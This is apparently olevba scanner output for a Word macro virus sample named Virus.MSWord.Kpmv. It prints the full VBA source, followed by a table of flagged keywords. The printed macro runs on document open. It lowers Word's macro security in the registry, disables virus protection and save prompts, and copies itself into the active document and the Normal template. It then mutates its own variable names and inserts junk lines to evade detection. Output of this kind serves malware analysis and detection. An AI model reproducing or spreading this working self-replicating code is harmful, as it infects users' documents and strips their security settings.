olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kpmv-5144516708133a61f3b87138f396e761680833f4cefd00620c248d6f9317e114
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kpmv-5144516708133a61f3b87138f396e761680833f4cefd00620c248d6f9317e114 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next
U7 = hl92x0N4M9o + O8S3o + I6D9n + K2S5m + C4
Dim nt30d2(27) As String: nt30d2(0) = "gb62q1": nt30d2(1) = "ak97u7": nt30d2(2) = "wb74h8": nt30d2(3) = "nz51y2": nt30d2(4) = "qh38x2": nt30d2(5) = "yh84f9": nt30d2(6) = "nz51y2": nt30d2(7) = "pe50q1": System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
P2 = K2L2j + V2L0s + U6G3q + S5H0z + N6P8v + U7J8u + F8
nt30d2(8) = "lx64u2": nt30d2(9) = "ji34f3": nt30d2(10) = "ve26y8": nt30d2(11) = "wx86j8": nt30d2(12) = "ui61t1": nt30d2(13) = "mc29t4": nt30d2(14) = "cg10j7": nt30d2(15) = "lc37x4": Options.VirusProtection = False
E6 = R1U1u + B3K3j + T2P2k + M4N0e + S3T7e + S9Q6q + L4
nt30d2(16) = "qr35u2": nt30d2(17) = "qm75i3": nt30d2(18) = "nc52u4": nt30d2(19) = "fb37m7": nt30d2(20) = "hl63u4": nt30d2(21) = "ib05n4": nt30d2(22) = "nt30d2": nt30d2(23) = "nn93j6": Options.SaveNormalPrompt = False
B4 = V2O2u + J0M5p + O3J4k + S2T4x + J6C9y + N8
nt30d2(24) = "ke49x8": nt30d2(25) = "bh53i3": nt30d2(26) = "hr33n0": nt30d2(27) = "hl92x0": Options.ConfirmConversions = False
G5 = Q7O1x + Q8R3z + F1C5y + A8E9j + E4I5l + Q2C6o + B3J6m + H8
Set gb62q1 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
K1 = P6L5i + A6U8x + L8
Set ak97u7 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
M2 = N7T3e + R4H7m + O2G8g + V5V5j + L6B9m + U9M4z + M8E7i + Q1U2k + K1P1i + B1D5z + K1
Set wb74h8 = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
A0 = S6K5h + K3O6n + S7J8k + S6G3f + I4
qh38x2 = "private sub" & " document_open()": yh84f9 = "end" & " sub"
F0 = B1H4y + O2C6e + K2O4k + K4R2r + P4I7x + R6H3r + I8M2m + R7
nz51y2 = wb74h8.Lines(1, wb74h8.CountOfLines)
V8 = O9V8t + F2B8f + I2S6y + H6G2p + U5C7l + I2
pe50q1 = InStr(LCase(nz51y2), qh38x2)
V5 = P6P7k + L9E1w + F8O2n + R3B0f + G2B8p + V4O8z + T3P5m + U7F6s + R4
lx64u2 = InStr(pe50q1, LCase(nz51y2), yh84f9) + Len(yh84f9)
P9 = Q8N4e + T7G6i + I3A1g + E3F1g + T5D8x + D4J6w + T6D1z + L7B2p + R4G7m + K5I3q + F2
ji34f3 = Mid(nz51y2, pe50q1, lx64u2 - pe50q1)
R7 = T7P3y + L2U7z + C0J6p + S4J8y + M0J7r + G7T3z + B5A7k + G0E4m + T5
If gb62q1.CountOfLines <> 0 Then
M6 = C9F4n + H1D6z + Q3H4j + C2P6y + M6H6h + O4O2f + V2
ve26y8 = gb62q1.Lines(1, gb62q1.CountOfLines)
G7 = P7B7h + A1Q4l + P4
If InStr(ve26y8, "(27) As String") = 0 Then
D6 = P1E8q + I1S3v + R6Q9l + G3G5v + D7V3e + N7G9u + O8C1v + M9J5o + U4F6l + U3C2g + B6D3p + C3
If InStr(LCase(ve26y8), qh38x2) <> 0 Then
L1 = Q7U5f + L8K2l + N0
wx86j8 = False
G8 = R1E5y + S2C2s + E1E7e + H5M6t + Q5R6u + T6
For ui61t1 = 1 To gb62q1.CountOfLines: DoEvents
A4 = K8O4z + J2C0q + Q7Q3z + R1A6z + Q3K6l + M5A8x + H4J1o + T8S7g + I8S6q + B9J6e + V8K3n + B4
If wx86j8 = False Then
G8 = A1N2j + S5J2f + U4B4j + J9R9h + B8
If LCase(gb62q1.Lines(ui61t1, 1)) = qh38x2 Then
E1 = U1U6y + E9E4x + U2U9e + M3T1q + C4S5j + N8J1t + R2G0o + F5U3o + N5V5g + K7O7f + O0
wx86j8 = True
D0 = U7O8h + J1V1g + K2F8x + I3F2p + U1U3s + L6K5z + K4E4g + M4
mc29t4 = ui61t1
V4 = K9U7o + O0I4k + B1T2r + E3
End If
O1 = S1D5k + I8V4x + P5U5q + C8J9h + Q7B3m + U0R7o + L6
Else
C5 = L4E4q + Q1H7x + A6H1l + U6P5e + G1K7x + G0H2t + J3I3f + F9E0g + D6
If LCase(gb62q1.Lines(ui61t1, 1)) = yh84f9 Then
P3 = O1L9o + U7S1j + T3F3f + F0H2i + M7J7q + R6
cg10j7 = ui61t1
F6 = S8S4x + O5C7s + M2P2g + L5D7t + C4V4p + D8F7p + T6L4o + V3F0n + P2O2f + B8
Exit For
E2 = K2U4t + J7O7r + H5P4z + I1G5k + J8S3v + O3
End If
H9 = G1G5v + M3T7k + I2C6k + G8D7o + M7J5o + D0
End If
U6 = P6U8t + K2B6v + U0V9q + C3S8l + G2G8y + L3
Next
F8 = M4A2p + F8A5y + E7
gb62q1.DeleteLines mc29t4, cg10j7 - (mc29t4 - 1)
D2 = Q2K9z + L8N3k + P4R0m + F2K1p + S7A3w + R5Q3z + K1C3s + L6G3x + V1U2h + I2J1o + G4Q1m + P3
End If
H8 = J5H0k + A6K3n + I9V7z + B8N2i + F1H5l + V2B4j + S5P3n + B2T5u + H7T9i + F7E4x + S3
Set lc37x4 = gb62q1
T8 = H6P7g + K1Q8p + M1Q8z + J6P4o + V2B7l + F8I9g + E4R2y + M1T1f + V6
gb62q1.addfromstring ji34f3: If ActiveDocument.Saved = False Then ActiveDocument.Save
E7 = Q0E2t + D9I3u + Q3K2f + T3F0z + S6P6q + J5L2m + K9R5m + B2
End If
L3 = G4R8k + Q8A6o + G3J4g + R3K2q + Q7E5n + O6F3w + J7O1t + Q9I1s + E1
Else
M7 = N2S4s + T4J5h + P3O4h + C0U7y + I8E5x + I5C4o + R2S2q + A0
Set lc37x4 = gb62q1
H4 = V5T3n + E8Q3i + I7F3v + A2J7v + N9U6l + V8
gb62q1.addfromstring ji34f3: If ActiveDocument.Saved = False Then ActiveDocument.Save
G7 = H4D1x + R7J3w + M4M7h + R9Q4j + J5
End If
L1 = O9R4k + S1P7w + G2S4g + N2F7u + B6S6e + E4E2y + H0P5j + E7N7z + G4
If ak97u7.CountOfLines <> 0 Then
J2 = C2J7k + K5T2w + D4L5f + H6G9i + B7A8g + O6K4x + D7R9r + J3R4f + B8V5l + J4R6h + N2
qr35u2 = ak97u7.Lines(1, ak97u7.CountOfLines)
F7 = M6P3m + O6O3w + J5
If InStr(qr35u2, "(27) As String") = 0 Then
G0 = B7A2i + B0C0p + P5
If InStr(LCase(qr35u2), qh38x2) <> 0 Then
R8 = I2O2p + V4U1k + S5C6p + F5G6r + J6
wx86j8 = False
L1 = V8E4v + U2O0n + K6
For ui61t1 = 1 To ak97u7.CountOfLines: DoEvents
M1 = M5P9j + F3A6i + C5L8t + S4V1l + I8I7z + T8I6n + M9V6x + K8A3k + L3M4q + C2
If wx86j8 = False Then
P8 = H5V2x + J3N4g + V9H9e + R8M8e + J1K6v + P9Q4u + K2K9x + C3I1m + N4I5f + G6J2j + L0G1f + Q1
If LCase(ak97u7.Lines(ui61t1, 1)) = qh38x2 Then
T5 = H3V6s + U1K4i + O5L7s + I1L6k + C8V2t + B5
wx86j8 = True
D8 = C1F2f + N8V3j + V1H3g + D2F5s + N3I2z + U3R5r + I7I5x + L5Q0u + J7B1t + L8D5w + S2S2e + R3
mc29t4 = ui61t1
V7 = L2G7k + E1T1p + O7R7e + C4I4p + A2
End If
Q3 = K8H7o + K9D8o + I0L3i + Q4H5e + D0
Else
V2 = T7F1i + V7E1t + M8V3u + A2
If LCase(ak97u7.Lines(ui61t1, 1)) = yh84f9 Then
E2 = V4C1q + E4P5v + G6O2p + O5Q7x + Q0C6q + D9G6r + Q3J6z + T3E4w + T6O0n + G3
cg10j7 = ui61t1
Q8 = F5L6w + E7A6i + A9L8u + V1
Exit For
T4 = G3I7e + R3I6n + K4V6y + J3A3k + J7M4r + K5C2g + G9V2y + I7N5g + H9
End If
M9 = P3M8f + I5K6v + O4Q4v + I6K9y + A7I1n + L8I5g + V7F8x + E1C7s + O3Q1s + A3S3j + T5K5j + L7
End If
T5 = G5L6l + R8R8k + S0B6f + Q1C9t + G8R0w + H3
Next
C5 = S2B2k + L7I2z + S7R5s + A8E2o + J9Q0v + H2B1t + E8V2n + R6S2f + B3R3u + K6G7k + T1
ak97u7.DeleteLines mc29t4, cg10j7 - (mc29t4 - 1)
O8 = G7O5s + A8I4q + U2A2u + C9D5f + I4D8p + G4L3i + H5
End If
B3 = P7D0w + S1F1j + N7A7k + K3V3v + A9I7s + G5O8m + F2C1j + N7E0m + V6G5u + B1O4n + E6P2f + V5
Set lc37x4 = ak97u7
M6 = U9M9j + U3A5x + K3S1t + B5
ak97u7.addfromstring ji34f3: If NormalTemplate.Saved = False Then NormalTemplate.Save
S9 = F4I1s + H1B7r + B0L8i + N4U6w + Q2
End If
R6 = R5L5u + Q4M2h + Q8C3n + O0
Else
U1 = M0L1v + P8D3z + P4
Set lc37x4 = ak97u7
L1 = R0U4o + P6A4s + V5G2r + P7A7v + B4R6w + S0U4z + G7R7t + O6
ak97u7.addfromstring ji34f3: If NormalTemplate.Saved = False Then NormalTemplate.Save
T7 = P0D6g + G4H1g + U2S0s + O6T3g + N6B5h + C9H6h + K1
End If
Q0 = B2O7p + N0H8t + E5T1e + D3N1h + S8U1w + T4D1f + H8Q0l + G8
If lc37x4 <> "" Then
J6 = O3N8q + L0L1k + S3E7o + I4H1r + R7R5h + J9
Dim qm75i3 As Long, nc52u4 As Long, fb37m7 As Long, hl63u4 As Long
S1 = M2T4s + G2O3q + D6G2u + I3J4f + O7J8p + M8R3i + O8J2s + P7F6n + H7
For ib05n4 = 0 To UBound(nt30d2): DoEvents
M9 = T1G7k + Q6F3v + G3N6s + U8
Randomize: nn93j6 = Chr(97 + (Rnd * 25)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)) & Chr(48 + (Rnd * 9)) & Chr(97 + (Rnd * 25)) & Chr(48 + (Rnd * 9)): DoEvents
E7 = L5H0j + T2K9m + F0L5u + B1Q1e + K1U1f + B3A1n + E3S8k + F4
qm75i3 = 1: nc52u4 = 1
N4 = Q6B1t + S0H4t + L7O1s + H6
With lc37x4
Q8 = B9N5v + N4A3n + C3A1x + B8R4v + V7S1h + E9
Do While .Find(nt30d2(ib05n4), qm75i3, nc52u4, fb37m7, hl63u4, True)
R5 = B0U9z + S4Q0v + U3J2z + E4V4o + A4E3o + P6C1j + V5I8i + V2F7v + H8A5x + C4E3z + M2B6u + U5
ke49x8 = .Lines(fb37m7, 1)
D1 = V4I5g + M7N1g + E6C9s + T0D2g + T1G4i + I3N6h + P1
bh53i3 = Mid(ke49x8, 1, nc52u4 - 1) & nn93j6 & Mid(ke49x8, hl63u4)
Q0 = H6T6q + T4N7t + E5V7r + J7S0h + S8A6n + D8J0f + N3A9l + I4
.replaceline fb37m7, bh53i3: DoEvents
P4 = U6T8q + R4R0k + C7K6o + O8N1r + B1B5h + P1P8m + T3J3p + N3E2n + F3O6i + V2
qm75i3 = fb37m7
V0 = V8V6m + N5D7s + V0
fb37m7 = .CountOfLines: nc52u4 = 1
U8 = A8R4k + D2T5t + E2S5h + R4N8j + N4D5p + N6G3w + S6T8g + S4
Loop
I4 = M1B3r + I2G8x + R2K9y + M9
End With
C5 = L4I7h + K8R3u + B7N8q + C1T3q + S8E8p + O2P2e + I1D4s + U5M1k + J4M9u + D9
Next
A8 = B4E6r + B0Q7x + C7G5m + T1C5i + A9R7n + L5L2l + H4Q2l + A7O9g + G5U7f + O2
With lc37x4
P4 = O9M4t + D1M8m + T3N5r + C6K4m + G5U4z + T8D8z + L6O7p + E1P1z + U7P9r + D4
For hr33n0 = 2 To (.CountOfLines - 1) Step 2: DoEvents
R6 = K2F8l + O6J5m + E5D6q + L6K5n + Q8I8e + D9M5k + S7O0k + G2G9p + J9N4n + H2U5m + K3A0p + P6
For hl92x0 = 1 To (Int(Rnd * 10) + 2): DoEvents
A8 = B3O7m + K6D2z + C6R5i + M2P2t + G8
Randomize: nn93j6 = nn93j6 + (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & (Chr(122 - Int(Rnd * 22))) & " + ": DoEvents
G4 = T3U6n + I3F2h + I4B3h + G4J7w + O9E9t + O8B4p + R2C5x + T2C5m + K3T7n + J4
Next hl92x0
B1 = G6M3f + L5D8l + N7B4e + V6D0m + L8
Randomize: .replaceline hr33n0, (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)) & " = " & nn93j6 & (Chr(65 + Int(Rnd * 22))) & Chr(48 + (Rnd * 9)): DoEvents
R5 = K1Q9g + B4S9o + E4N6l + D7B3z + K3P5m + M6V9l + L8J8u + H1V2j + B0I3x + N4R1p + C4R9z + I9
nn93j6 = "": DoEvents
P6 = P4J6w + Q9A7g + R6M4r + M1I5n + P8B7r + E5Q2q + A4A2q + U8
Next hr33n0
E6 = V5E6k + P7T2n + H8S3y + S0R8r + G8P2m + L2M1h + U4E4h + G4F5v + U7
End With
B2 = T1U0h + N6U9w + C0F1v + D2L8q + L2
End If
I4 = N0E3l + E6Q5s + D3K5v + S8S5p + D8E7h + H9O4z + Q1D3k + O3K3j + L1J5z + B7F5q + E5
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

